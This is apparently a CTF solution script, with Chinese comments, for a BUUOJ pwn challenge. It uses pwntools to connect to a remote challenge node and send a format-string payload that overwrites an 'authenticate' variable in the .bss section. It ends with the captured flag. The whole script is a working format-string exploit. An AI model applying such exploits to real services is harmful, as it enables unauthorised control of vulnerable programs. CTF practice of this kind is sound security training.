from pwn import *

# 格式化字符串bss段写，通过判断读取flag
context(os='linux', arch='i386')

authenticate = 0x804a04c

p = remote('node4.buuoj.cn', 29607)

payload = fmtstr_payload(offset=11, writes={authenticate: 1}, write_size='byte')
p.sendline(payload)
p.interactive()

# 还真就这么简单：flag{2f1221a9-bc05-4571-b3bd-6321eb7fd03f}